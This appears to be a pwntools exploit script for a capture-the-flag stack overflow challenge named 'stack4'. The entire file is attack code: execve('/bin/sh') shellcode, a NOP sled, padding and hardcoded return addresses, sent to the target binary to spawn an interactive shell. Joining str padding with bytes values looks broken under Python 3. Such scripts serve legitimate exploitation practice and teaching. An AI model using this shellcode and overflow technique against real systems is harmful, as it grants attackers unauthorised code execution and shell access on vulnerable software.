from pwn import *
#context.log_level='debug'
shellcode = b'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'
#shellcode = b'\x6a\x0b\x58\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
noOp = b"\x90" * 100
ret = p32(0xffffd5a0) # ebp 0xffffd588
ret_4 = p32(0xffffd5ca)
padding = "a" * 68
filler = "B" * 8
payload = padding + ret + filler + ret_4 + noOp + shellcode

#print(payload)

p = process("/problems/stack4r_0_245c5c4c5e12e771e6f9c9e78ce57a2f/stack4")
p.send(payload)
p.interactive()

